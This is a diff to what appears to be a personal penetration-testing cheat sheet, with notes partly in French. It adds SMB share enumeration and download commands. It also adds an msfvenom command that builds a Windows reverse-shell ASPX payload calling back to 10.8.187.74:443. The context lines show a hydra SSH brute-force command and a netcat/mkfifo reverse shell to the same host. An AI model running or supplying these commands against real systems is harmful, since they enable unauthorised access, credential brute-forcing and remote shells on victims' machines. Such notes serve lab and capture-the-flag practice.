@@ -283,6 +283,26 @@ hydra -l <USER> -P <WORDLIST> <IP> ssh -t 4 -V
 enum4linux -U -G -S -P <cible>
 ````
 
+- Get share names :
+````
+smbclient -L //<IP>
+````
+
+- Access to a share
+````
+smbclient //<IP>/<SHARE_NAME>
+````
+
+- Download a file (once connected)
+````
+get <FILENAME>
+````
+
+- Other commands
+````
+ls, 
+````
+
 -----
 
 ## Stabilize shell
@@ -378,6 +398,9 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.187.74 9000 >/tmp/f
 
 
 # TO INCORPORATE
+
+# Reverse shell on windows 64, aspx file
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.187.74 LPORT=443 -f aspx > relevant.aspx
 
 #BorgBackup
 extraire une backup : borg extract home/field/dev/final_archive/::<nom>
